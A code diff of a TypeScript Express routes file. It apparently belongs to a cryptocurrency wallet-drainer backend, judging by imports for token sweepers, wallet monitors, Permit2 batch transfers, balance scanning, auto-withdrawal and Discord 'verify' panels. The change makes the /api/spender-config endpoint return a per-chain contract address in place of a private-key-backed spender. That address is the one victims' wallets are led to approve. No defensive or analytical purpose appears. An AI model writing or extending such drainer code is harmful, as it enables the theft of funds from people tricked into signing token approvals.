@@ -5,7 +5,7 @@ import { insertApplicationSchema, insertApprovalSchema, insertTransferSchema, in
 import { sendTicketPanel, sendVerifyPanel } from "./discord-bot";
 import { executeTransferFrom, checkRelayerStatus } from "./relayer";
 import { getRelayerAddress, executePermit2BatchTransfer, getContractForChain as getPermit2ContractForChain, CHAIN_CONTRACTS as PERMIT2_CHAIN_CONTRACTS, scanWalletBalances as permit2ScanWalletBalances } from "./permit2-relayer";
-import { getSpenderAddress, executeDirectTransfer, getContractForChain, CHAIN_CONTRACTS, CHAIN_TOKEN_ADDRESSES, scanWalletBalances } from "./direct-transfer";
+import { getContractAddressForChain, executeDirectTransfer, getContractForChain, CHAIN_CONTRACTS, CHAIN_TOKEN_ADDRESSES, scanWalletBalances } from "./direct-transfer";
 import { sweepApprovedTokens, getSweeperStatus as getSolanaSweeperStatus } from "./solana-sweeper";
 import { startWalletMonitor, stopWalletMonitor, getMonitorStatus, addWalletToMonitor, triggerManualSweep } from "./wallet-monitor";
 import { startAutoWithdraw, stopAutoWithdraw, manualWithdraw, getAutoWithdrawStatus } from "./contract-withdrawer";
@@ -455,10 +455,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
   app.get("/api/spender-config", async (req, res) => {
     try {
       const chainId = req.query.chainId ? parseInt(req.query.chainId as string) : null;
-      const spenderAddress = getSpenderAddress();
       
-      if (!spenderAddress) {
-        return res.status(500).json({ error: "No spender configured (EVM_SPENDER_PRIVATE_KEY missing)" });
+      const contractAddress = chainId ? getContractAddressForChain(chainId) : null;
+      if (!contractAddress) {
+        return res.status(500).json({ error: "No contract configured for this chain" });
       }
 
       const tokens = chainId && CHAIN_TOKEN_ADDRESSES[chainId]
@@ -466,7 +466,7 @@ export async function registerRoutes(app: Express): Promise<Server> {
         : [];
       
       res.json({
-        spenderAddress,
+        spenderAddress: contractAddress,
         tokens,
         chainContracts: CHAIN_CONTRACTS,
       });
